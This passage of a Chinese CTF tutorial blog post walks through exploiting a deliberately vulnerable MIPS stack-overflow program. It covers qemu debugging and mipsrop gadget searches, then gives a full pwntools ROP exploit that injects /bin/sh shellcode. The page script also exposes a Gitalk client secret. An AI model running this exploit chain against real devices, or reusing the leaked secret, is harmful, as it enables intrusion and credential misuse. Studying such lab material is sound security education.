<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Try Again\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>安装交叉编译工具</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> update
<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> binutils-mipsel-linux-gnu
<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> gcc-mipsel-linux-gnu<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>编译上面的源码</p>
<pre class="line-numbers language-bash"><code class="language-bash">mipsel-linux-gnu-gcc -fno-stack-protector stack_bof_02.c -o stack_bof_02<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>程序保护<br><img src="/images/loading.gif" data-original="../images/CTF/20201028025118.png" alt=""><br>代码逻辑很简单，在 strcpy 的地方有一处栈溢出。</p>
<blockquote>
<p>程序调试<br><code>qemu-mipsel-static -g 1234 -L ./mipsel ./vuln_system  PAYLOAD</code><br>-g 指定调试端口， -L 指定 lib 等文件的目录，当程序起来之后<br><code>gdb-multiarch stack_bof_02</code> 运行如下命令，然后在 gdb 里运行 <code>target remote 127.0.0.1:1234</code> 即可挂上调试器<br><img src="/images/loading.gif" data-original="../images/CTF/20201028030938.png" alt=""><br>返回地址位于 $sp+532 , buf 位于 $fp+24<br>即 padding 为 <code>pay += b'a'*508</code></p>
</blockquote>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># padding :532 - 24 = 508</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>

pay <span class="token operator">=</span>  b<span class="token string">''</span>
pay <span class="token operator">+=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">508</span>
pay <span class="token operator">+=</span> b<span class="token string">'b'</span><span class="token operator">*</span><span class="token number">4</span>

<span class="token comment" spellcheck="true"># with open('payload','wb') as f:</span>
<span class="token comment" spellcheck="true">#     f.write(pay)</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'qemu-mipsel-static'</span><span class="token punctuation">,</span> <span class="token string">'-L'</span><span class="token punctuation">,</span> <span class="token string">'./mipsel'</span><span class="token punctuation">,</span> <span class="token string">'-g'</span><span class="token punctuation">,</span> <span class="token string">'1234'</span><span class="token punctuation">,</span><span class="token string">'./stack_bof_02'</span><span class="token punctuation">,</span> pay<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># p = process(['qemu-mipsel-static', '-L', './mipsel', './stack_bof_02'])</span>
pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如下图所示，即可控制 ra 寄存器，进而控制 PC<br><img src="/images/loading.gif" data-original="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028031120.png" alt=""></p>
<blockquote>
<p>查找使用的 gadget 完成 ret2shellcode<br>由于程序没有开启 PIE 等 保护，所以我们可以直接在栈上注入 shellcode，然后控制 PC跳转到栈上</p>
</blockquote>
<p>找 gadget 我们可以使用 mipsrop.py 这个 ida 插件进行。</p>
<p>由于 mips 流水指令集的特点，存在 cache incoherency 的特性，需要调用 sleep 或者其他函数将数据区刷新到当前指令区中去，才能正常执行 shellcode。为了找到更多的 gadget，以及这是一个 demo ，所有我们在 libc 里查找</p>
<h4 id="1-调用-sleep-函数"><a href="#1-调用-sleep-函数" class="headerlink" title="1. 调用 sleep 函数"></a>1. 调用 sleep 函数</h4><p>调用 sleep 函数之前，我们需要先找到对 a0 进行设置的 gadget</p>
<pre><code>Python&gt;mipsrop.find("li $a0, 1")
----------------------------------------------------------------------------------------------------------------
|  Address     |  Action                                              |  Control Jump                          |
----------------------------------------------------------------------------------------------------------------
|  0x000B9350  |  li $a0,1                                            |  jalr  $s2                             |
|  0x000E2660  |  li $a0,1                                            |  jalr  $s2                             |
|  0x00109918  |  li $a0,1                                            |  jalr  $s1                             |
|  0x0010E604  |  li $a0,1                                            |  jalr  $s2                             |
|  0x0012D650  |  li $a0,1                                            |  jalr  $s0                             |
|  0x0012D658  |  li $a0,1                                            |  jalr  $s2                             |
|  0x00034C5C  |  li $a0,1                                            |  jr    0x18+var_s4($sp)                |
|  0x00080100  |  li $a0,1                                            |  jr    0x18+var_s4($sp)                |
|  0x00088E80  |  li $a0,1                                            |  jr    0x1C+var_s0($sp)                |
|  0x00091134  |  li $a0,1                                            |  jr    0x70+var_s24($sp)               |
|  0x00091BB0  |  li $a0,1                                            |  jr    0x70+var_s24($sp)               |
|  0x000D5460  |  li $a0,1                                            |  jr    0x1C+var_s10($sp)               |
|  0x000F2A80  |  li $a0,1                                            |  jr    0x1C+var_s0($sp)                |
|  0x001251C0  |  li $a0,1                                            |  jr    0x18+var_s14($sp)               |
----------------------------------------------------------------------------------------------------------------
Found 14 matching gadgets</code></pre><p>例如我们这里选择了  0x00E2660 处的 gadget</p>
<pre><code>.text:000E2660                 move    $t9, $s2
.text:000E2664                 jalr    $t9 ; sigprocmask
.text:000E2668                 li      $a0, 1</code></pre><p>我们发现，这个 gadget 最后会跳到 s2 寄存器里的值的位置，所以，我下一步需要找到能控制 s2 的寄存器</p>
<p>通常而言，我们这里会使用 mipsrop 插件的 <code>mipsrop.tail()</code> 方法来寻找，从栈上设置寄存器的 gadget </p>
<pre><code>Python&gt;mipsrop.tail()
----------------------------------------------------------------------------------------------------------------
|  Address     |  Action                                              |  Control Jump                          |
----------------------------------------------------------------------------------------------------------------
|  0x0001E598  |  move $t9,$s2                                        |  jr    $s2                             |
|  0x000F7758  |  move $t9,$s1                                        |  jr    $s1                             |
|  0x000F776C  |  move $t9,$s1                                        |  jr    $s1                             |
|  0x000F7868  |  move $t9,$s1                                        |  jr    $s1                             |
|  0x000F787C  |  move $t9,$s1                                        |  jr    $s1                             |
|  0x000F86D4  |  move $t9,$s4                                        |  jr    $s4                             |
|  0x000F8794  |  move $t9,$s5                                        |  jr    $s5                             |
|  0x00127E6C  |  move $t9,$s0                                        |  jr    $s0                             |
|  0x0012A80C  |  move $t9,$s0                                        |  jr    $s0                             |
|  0x0012A880  |  move $t9,$s0                                        |  jr    $s0                             |
|  0x0012F4A8  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x0013032C  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x00130344  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x00132C58  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x00133888  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x0013733C  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x00137354  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x00137CDC  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x00137CF4  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x00139BFC  |  move $t9,$s4                                        |  jr    $s4                             |
----------------------------------------------------------------------------------------------------------------
Found 20 matching gadgets</code></pre><p>如果没有合适的，我们可以尝试找在一些 “*dir” 的函数结尾来查找，有没有合适的，例如我在 readdir64 函数的末尾发现如下 gadget<br><img src="/images/loading.gif" data-original="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20201029161619764.png" alt=""></p>
<p>这样我们就能控制 s2 寄存器也能控制 PC，下一步就是跳到 sleep, 但是单纯的跳到 sleep 是不够的，同时我们要保证执行完 sleep 后能跳到下一个 gadget ，所以我们还需要一个既能 执行 sleep 又能控制下一个 PC 地址的 gadget<br>看了眼寄存器，此时 我们还能控制的还挺多，例如我这里找 $a3 的寄存器</p>
<pre><code>Python&gt;mipsrop.find("mov $t9, $s3")
----------------------------------------------------------------------------------------------------------------
|  Address     |  Action                                              |  Control Jump                          |
----------------------------------------------------------------------------------------------------------------
|  0x0001CE80  |  move $t9,$s3                                        |  jalr  $s3                             |
..........
|  0x000949EC  |  move $t9,$s3                                        |  jalr  $s3                             |
....</code></pre><p>通过这个 gadget 我们先跳到 s3 的寄存器执行 sleep ，再通过控制的 ra 寄存器进行下一步操作</p>
<pre><code>.text:000949EC                 move    $t9, $s3
.text:000949F0                 jalr    $t9 ; uselocale
.text:000949F4                 move    $s0, $v0
.text:000949F8
.text:000949F8 loc_949F8:                               # CODE XREF: strerror_l+15C↓j
.text:000949F8                 lw      $ra, 0x34($sp)
.text:000949FC                 move    $v0, $s0
.text:00094A00                 lw      $s3, 0x24+var_sC($sp)
.text:00094A04                 lw      $s2, 0x24+var_s8($sp)
.text:00094A08                 lw      $s1, 0x24+var_s4($sp)
.text:00094A0C                 lw      $s0, 0x24+var_s0($sp)
.text:00094A10                 jr      $ra
.text:00094A14                 addiu   $sp, 0x38</code></pre><p>通过这个 gadget 我们先跳到 s3 的寄存器执行 sleep ，再通过控制的 ra 寄存器进行下一步操作</p>
<h4 id="2-jmp-shellcode"><a href="#2-jmp-shellcode" class="headerlink" title="2. jmp shellcode"></a>2. jmp shellcode</h4><p>下一步就是跳到 shellcode ，要跳到shellcode 我们先需要获得栈地址</p>
<p>我们先用 <code>Python&gt;mipsrop.stackfinder()</code></p>
<p>获得 如下 gadget</p>
<pre class="line-numbers language-asm"><code class="language-asm">  .text:00095B74                 addiu   $a1, $sp, 52
  .text:00095B78                 sw      $zero, 24($sp)
  .text:00095B7C                 sw      $v0, 20($sp)
  .text:00095B80                 move    $a3, $s2
  .text:00095B84                 move    $t9, $s5
  .text:00095B88                 jalr    $t9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>该 gadget 可以将栈地址， 即 $sp+24 的值赋值给 $a0 ，那么这个栈就是我们即将填充 shellcode 的地方， $s5 可控，最后这段 gadget 会跳往 $s5 , 那么我们只需要再找一个直接 jr $a0 的gadget 即可</p>
<pre><code>  Python&gt;mipsrop.find("move $t9, $a1")
  ----------------------------------------------------------------------------------------------------------------
  |  Address     |  Action                                              |  Control Jump                          |
  ----------------------------------------------------------------------------------------------------------------
  |  0x000FA0A0  |  move $t9,$a1                                        |  jalr  $a1                             |
  |  0x0012568C  |  move $t9,$a1                                        |  jalr  $a1                             |
  |  0x0012F4A8  |  move $t9,$a1                                        |  jr    $a1                             |
  |  0x0013032C  |  move $t9,$a1                                        |  jr    $a1                             |
  |  0x00130344  |  move $t9,$a1                                        |  jr    $a1                             |
  |  0x00132C58  |  move $t9,$a1                                        |  jr    $a1                             |
  |  0x00133888  |  move $t9,$a1                                        |  jr    $a1                             |
  |  0x0013733C  |  move $t9,$a1                                        |  jr    $a1                             |
  |  0x00137354  |  move $t9,$a1                                        |  jr    $a1                             |
  |  0x00137CDC  |  move $t9,$a1                                        |  jr    $a1                             |
  |  0x00137CF4  |  move $t9,$a1                                        |  jr    $a1                             |
  ----------------------------------------------------------------------------------------------------------------
  Found 11 matching gadgets</code></pre><p>这里使用的是 </p>
<pre><code>  .text:0012568C                 move    $t9, $a1
  .text:00125690                 move    $a3, $v0
  .text:00125694                 move    $a1, $a0
  .text:00125698                 jalr    $t9</code></pre><p>最后的 exploit</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true"># context.log_level = 'debug'</span>

libc_base <span class="token operator">=</span> <span class="token number">0x7f61f000</span>
set_a0_addr <span class="token operator">=</span> <span class="token number">0xE2660</span>
<span class="token comment" spellcheck="true">#.text:000E2660                 move    $t9, $s2</span>
<span class="token comment" spellcheck="true">#.text:000E2664                 jalr    $t9 ; sigprocmask</span>
<span class="token comment" spellcheck="true">#.text:000E2668                 li      $a0, 1</span>
set_s2_addr <span class="token operator">=</span> <span class="token number">0xB2EE8</span>
<span class="token comment" spellcheck="true">#.text:000B2EE8                 lw      $ra, 52($sp)</span>
<span class="token comment" spellcheck="true">#.text:000B2EF0                 lw      $s6, 48($sp)</span>
<span class="token comment" spellcheck="true">#.text:000B2EF4                 lw      $s5, 44($sp)</span>
<span class="token comment" spellcheck="true">#.text:000B2EF8                 lw      $s4, 40($sp)</span>
<span class="token comment" spellcheck="true">#.text:000B2EFC                 lw      $s3, 36($sp)</span>
<span class="token comment" spellcheck="true">#.text:000B2F00                 lw      $s2, 32($sp)</span>
<span class="token comment" spellcheck="true">#.text:000B2F04                 lw      $s1, 28($sp)</span>
<span class="token comment" spellcheck="true">#.text:000B2F08                 lw      $s0, 24($sp)</span>
<span class="token comment" spellcheck="true">#.text:000B2F0C                 jr      $ra</span>
jr_t9_jr_ra <span class="token operator">=</span> <span class="token number">0x949EC</span>
<span class="token comment" spellcheck="true"># .text:000949EC                 move    $t9, $s3</span>
<span class="token comment" spellcheck="true"># .text:000949F0                 jalr    $t9 ; uselocale</span>
<span class="token comment" spellcheck="true"># .text:000949F4                 move    $s0, $v0</span>
<span class="token comment" spellcheck="true"># .text:000949F8</span>
<span class="token comment" spellcheck="true"># .text:000949F8 loc_949F8:                               # CODE XREF: strerror_l+15C↓j</span>
<span class="token comment" spellcheck="true"># .text:000949F8                 lw      $ra, 0x34($sp)</span>
<span class="token comment" spellcheck="true"># .text:000949FC                 move    $v0, $s0</span>
<span class="token comment" spellcheck="true"># .text:00094A00                 lw      $s3, 0x24+var_sC($sp)</span>
<span class="token comment" spellcheck="true"># .text:00094A04                 lw      $s2, 0x24+var_s8($sp)</span>
<span class="token comment" spellcheck="true"># .text:00094A08                 lw      $s1, 0x24+var_s4($sp)</span>
<span class="token comment" spellcheck="true"># .text:00094A0C                 lw      $s0, 0x24+var_s0($sp)</span>
<span class="token comment" spellcheck="true"># .text:00094A10                 jr      $ra</span>
addiu_a1_sp <span class="token operator">=</span> <span class="token number">0x95B74</span>
<span class="token comment" spellcheck="true"># .text:00095B74                 addiu   $a1, $sp, 52</span>
<span class="token comment" spellcheck="true"># .text:00095B78                 sw      $zero, 24($sp)</span>
<span class="token comment" spellcheck="true"># .text:00095B7C                 sw      $v0, 20($sp)</span>
<span class="token comment" spellcheck="true"># .text:00095B80                 move    $a3, $s2</span>
<span class="token comment" spellcheck="true"># .text:00095B84                 move    $t9, $s5</span>
<span class="token comment" spellcheck="true"># .text:00095B88                 jalr    $t9</span>
jr_a1 <span class="token operator">=</span> <span class="token number">0x12568C</span>
<span class="token comment" spellcheck="true"># .text:0012568C                 move    $t9, $a1</span>
<span class="token comment" spellcheck="true"># .text:00125690                 move    $a3, $v0</span>
<span class="token comment" spellcheck="true"># .text:00125694                 move    $a1, $a0</span>
<span class="token comment" spellcheck="true"># .text:00125698                 jalr    $t9</span>
sleep <span class="token operator">=</span> <span class="token number">0xB8FC0</span>

shellcode  <span class="token operator">=</span> b<span class="token string">""</span>
shellcode <span class="token operator">+=</span> b<span class="token string">"\xff\xff\x06\x28"</span>  <span class="token comment" spellcheck="true"># slti $a2, $zero, -1</span>
shellcode <span class="token operator">+=</span> b<span class="token string">"\x62\x69\x0f\x3c"</span>  <span class="token comment" spellcheck="true"># lui $t7, 0x6962</span>
shellcode <span class="token operator">+=</span> b<span class="token string">"\x2f\x2f\xef\x35"</span>  <span class="token comment" spellcheck="true"># ori $t7, $t7, 0x2f2f</span>
shellcode <span class="token operator">+=</span> b<span class="token string">"\xf4\xff\xaf\xaf"</span>  <span class="token comment" spellcheck="true"># sw $t7, -0xc($sp)</span>
shellcode <span class="token operator">+=</span> b<span class="token string">"\x73\x68\x0e\x3c"</span>  <span class="token comment" spellcheck="true"># lui $t6, 0x6873</span>
shellcode <span class="token operator">+=</span> b<span class="token string">"\x6e\x2f\xce\x35"</span>  <span class="token comment" spellcheck="true"># ori $t6, $t6, 0x2f6e</span>
shellcode <span class="token operator">+=</span> b<span class="token string">"\xf8\xff\xae\xaf"</span>  <span class="token comment" spellcheck="true"># sw $t6, -8($sp)</span>
shellcode <span class="token operator">+=</span> b<span class="token string">"\xfc\xff\xa0\xaf"</span>  <span class="token comment" spellcheck="true"># sw $zero, -4($sp)</span>
shellcode <span class="token operator">+=</span> b<span class="token string">"\xf4\xff\xa4\x27"</span>  <span class="token comment" spellcheck="true"># addiu $a0, $sp, -0xc</span>
shellcode <span class="token operator">+=</span> b<span class="token string">"\xff\xff\x05\x28"</span>  <span class="token comment" spellcheck="true"># slti $a1, $zero, -1</span>
shellcode <span class="token operator">+=</span> b<span class="token string">"\xab\x0f\x02\x24"</span>  <span class="token comment" spellcheck="true"># addiu;$v0, $zero, 0xfab</span>
shellcode <span class="token operator">+=</span> b<span class="token string">"\x0c\x01\x01\x01"</span>  <span class="token comment" spellcheck="true"># syscall 0x40404</span>

pay <span class="token operator">=</span>  b<span class="token string">''</span>
pay <span class="token operator">+=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">508</span>
pay <span class="token operator">+=</span> p32<span class="token punctuation">(</span>set_s2_addr<span class="token operator">+</span>libc_base<span class="token punctuation">)</span>
pay <span class="token operator">+=</span> b<span class="token string">'b'</span><span class="token operator">*</span><span class="token number">24</span>
pay <span class="token operator">+=</span> b<span class="token string">'1111'</span>                    <span class="token comment" spellcheck="true">#s0</span>
pay <span class="token operator">+=</span> b<span class="token string">'2222'</span>                    <span class="token comment" spellcheck="true">#s1</span>
pay <span class="token operator">+=</span> p32<span class="token punctuation">(</span>jr_t9_jr_ra<span class="token operator">+</span>libc_base<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#s2 - > set a0 </span>
pay <span class="token operator">+=</span> p32<span class="token punctuation">(</span>sleep<span class="token operator">+</span>libc_base<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">#s3</span>
pay <span class="token operator">+=</span> b<span class="token string">'5555'</span>                    <span class="token comment" spellcheck="true">#s4</span>
pay <span class="token operator">+=</span> p32<span class="token punctuation">(</span>jr_a1<span class="token operator">+</span>libc_base<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#s5</span>
pay <span class="token operator">+=</span> b<span class="token string">'7777'</span>                    <span class="token comment" spellcheck="true">#s6</span>
pay <span class="token operator">+=</span> p32<span class="token punctuation">(</span>set_a0_addr<span class="token operator">+</span>libc_base<span class="token punctuation">)</span>
pay <span class="token operator">+=</span> b<span class="token string">'c'</span><span class="token operator">*</span><span class="token number">0x34</span>
pay <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addiu_a1_sp<span class="token operator">+</span>libc_base<span class="token punctuation">)</span>
pay <span class="token operator">+=</span> b<span class="token string">'d'</span><span class="token operator">*</span><span class="token number">52</span>
pay <span class="token operator">+=</span> shellcode

log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>hex<span class="token punctuation">(</span><span class="token number">0x94A10</span><span class="token operator">+</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'addiu_a0_sp_24: {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>addiu_a1_sp<span class="token operator">+</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'payload'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># p = process(['qemu-mipsel-static', '-L', './mipsel', '-g', '1234','./stack_bof_02', pay])</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'qemu-mipsel-static'</span><span class="token punctuation">,</span> <span class="token string">'-L'</span><span class="token punctuation">,</span> <span class="token string">'./mipsel'</span><span class="token punctuation">,</span> <span class="token string">'./stack_bof_02'</span><span class="token punctuation">,</span>pay<span class="token punctuation">]</span><span class="token punctuation">)</span>
pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://jackhcc.github.io" rel="external nofollow noreferrer">杰克成</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://jackhcc.github.io/posts/ctf-pwn.html">https://jackhcc.github.io/posts/ctf-pwn.html</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="https://jackhcc.github.io" target="_blank">杰克成</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/CTF-Pwn/">
                                    <span class="chip bg-color">CTF-Pwn</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/libs/share/css/share.min.css">

<div id="article-share">
    
    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/medias/reward/aliqr.png" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/medias/reward/wxqr.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>
            
        </div>
    </div>

    
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/libs/gitalk/gitalk.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/css/my-gitalk.css">

<div class="card gitalk-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="gitalk-container" class="card-content"></div>
</div>

<script src="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/libs/gitalk/gitalk.min.js"></script>
<script>
    let gitalk = new Gitalk({
        clientID: '3821a0bbb773038a51fc',
        clientSecret: '4b30b507d67ec5497ec0e77f43f80cb3e0d7dd3a',
        repo: 'JackHCC.github.io',
        owner: 'JackHCC',
        admin: "JackHCC",
        id: '2021-08-20T23-23-30',
        distractionFreeMode: false  // Facebook-like distraction free mode
    });

    gitalk.render('gitalk-container');
</script>
    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/posts/gan.html">
                    <div class="card-image">
                        
                        
                        <img src="/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/medias/featureimages/17.jpg" class="responsive-img" alt="GAN详解">
                        
                        <span class="card-title">GAN详解</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            GAN 学习纪录
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2021-08-23
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Deep-Learning/" class="post-category">
                                    Deep Learning
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/GAN/">
                        <span class="chip bg-color">GAN</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/posts/ctf-reverse.html">
                    <div class="card-image">
                        
                        
                        <img src="/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/medias/featureimages/10.jpg" class="responsive-img" alt="CTF-Reverse要点">
                        
                        <span class="card-title">CTF-Reverse要点</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            CTF逆向学习要点
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-19
                            </span>
